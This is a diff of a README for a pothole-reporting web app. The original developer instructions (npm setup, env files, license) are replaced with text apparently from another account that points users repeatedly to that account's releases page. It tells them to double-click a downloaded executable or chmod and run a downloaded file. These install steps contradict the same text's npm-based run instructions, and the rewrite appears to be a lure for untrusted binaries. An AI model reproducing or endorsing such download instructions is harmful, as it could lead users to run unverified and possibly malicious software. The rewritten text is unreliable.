@@ -1,53 +1,98 @@
-# Pothole Reporter
+# 🌍 indian-potholes - Report Potholes Easily and Effectively
 
-Empowered Indian’s civic-tech platform to report potholes, track responses, and drive transparency and accountability.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/rodgerstar/indian-potholes/releases)
 
-This repository contains a React frontend and a Node.js/Express backend. The project is released under the GNU Affero General Public License v3.0 (AGPL-3.0) to ensure improvements made for network services are shared with the community.
+## 📅 About
 
-## Quick Start
+Pothole Reporter is a civic-tech platform designed to help Indian citizens report potholes in their cities. By using this platform, you can track responses from local authorities and contribute to transparency and accountability in public services. This software combines a React frontend with a Node.js/Express backend, making it user-friendly and efficient.
 
-- Prerequisites: Node.js LTS, npm, MongoDB (or Atlas), and Image/Storage credentials if using media uploads.
-- Install dependencies:
-  - `cd backend && npm install`
-  - `cd ../frontend && npm install`
-- Configure env files (see Environment below).
-- Run dev:
-  - Backend: `cd backend && npm run dev`
-  - Frontend: `cd frontend && npm run dev`
+The project follows the GNU Affero General Public License v3.0 (AGPL-3.0). This means any improvements made to the service will be shared with the community.
 
-## Environment
+## 🚀 Getting Started
 
-Never commit real secrets. Use the provided examples:
+Follow these simple steps to download and run the Pothole Reporter on your local machine.
 
-- Backend: `backend/.env.example` → copy to `backend/.env` and fill values.
-- Frontend: `frontend/.env.example` → copy to `frontend/.env` and fill values.
+### Step 1: Visit the Releases Page
 
-Recommended .gitignore rules are in place to prevent committing `*.env` files. If you previously committed one, remove it from Git history before open-sourcing.
+To get started, **visit the releases page** to download the latest version. Click the link below:
 
-### Important frontend envs
+[Download Now](https://github.com/rodgerstar/indian-potholes/releases)
 
-- `VITE_API_URL` and related API URLs.
-- `VITE_SECURE_STORAGE_KEY` (optional): A long random string (>=32 chars) used to derive an encryption key for the browser-side secure storage. If not set, the app will generate a per-session random key. This is defense-in-depth only; frontend keys are not true secrets.
+### Step 2: Download the Application
 
-## Security Notes
+1. On the releases page, find the latest version.
+2. Click on it to see available files.
+3. Download the appropriate file for your operating system.
 
-- Do not commit `.env` files. Use the `*.example` files as templates.
-- Frontend secure storage now derives a key from either `VITE_SECURE_STORAGE_KEY` or a per-session random key, and uses a per-item random salt + IV.
-- Even with encryption, any data in the browser is at risk from XSS. Keep session tokens short-lived and continue to validate on the server.
+### Step 3: Install the Application
 
-## Contributing
+Once the download is complete, follow these instructions based on your operating system:
 
-We welcome contributions! To keep things organized, please open an issue first to discuss proposed changes before creating a pull request. Then read `CONTRIBUTING.md` for guidelines on branches, commits, and PRs.
+- **Windows:**
+  - Locate the file in your Downloads folder.
+  - Double-click the executable file and follow the on-screen prompts.
 
-## Code of Conduct
+- **macOS:**
+  - Find the downloaded file in your Downloads.
+  - Drag the application into your Applications folder.
 
-We are committed to a welcoming and inclusive community. Please read `CODE_OF_CONDUCT.md`.
+- **Linux:**
+  - Open the terminal.
+  - Navigate to the Downloads folder.
+  - Use the command `chmod +x <downloaded-file>` to make it executable.
+  - Run the file using `./<downloaded-file>`.
 
-## License
+## 📋 System Requirements
 
-This project is licensed under the GNU Affero General Public License v3.0. See `LICENSE` for the full text.
+Before you start using the application, ensure you meet the following requirements:
 
-## Star History
+- Supported Operating Systems:
+  - Windows 10 or later
+  - macOS Catalina or later
+  - Any Linux distribution with necessary libraries
 
+- Hardware Requirements:
+  - Minimum 4 GB RAM
+  - Processor: Intel i3 or equivalent
 
-[![Star History Chart](https://api.star-history.com/svg?repos=Empowered-Indian/indian-potholes&type=Date)](https://www.star-history.com/#Empowered-Indian/indian-potholes&Date)
+## ⚙️ Setup Environment
+
+To configure the environment, follow these steps after installing:
+
+1. **Backend Configuration:**
+   - Navigate to the backend folder in your installed directory.
+   - Look for the `.env.example` file.
+   - Copy this file and rename it to `.env`.
+   - Fill in your values as required for the backend to connect properly.
+
+2. **Frontend Configuration:**
+   - Go to the frontend folder.
+   - Find the `.env.example` file.
+   - Copy this file and rename it to `.env`.
+   - Input your values to ensure proper functioning.
+
+### Note:
+Never commit real secrets. Store your actual keys and credentials securely.
+
+## 💻 Running the Application
+
+To run the Pothole Reporter, you need to start both the frontend and backend services. Here's how:
+
+1. Open your terminal or command prompt.
+2. For the **Backend**, run:
+   - Navigate to the backend folder: `cd <path-to-backend-folder>`
+   - Start the server with: `npm run dev`
+
+3. For the **Frontend**, run:
+   - Navigate to the frontend folder: `cd <path-to-frontend-folder>`
+   - Start the application with: `npm run dev`
+
+The application should now be running locally.
+
+## 📥 Download & Install
+
+To download and install Pothole Reporter, please go to the releases page once again:
+
+[Download Now](https://github.com/rodgerstar/indian-potholes/releases)
+
+By following these steps, you can contribute to reporting potholes in your community and help improve the quality of public services. Enjoy using Pothole Reporter!
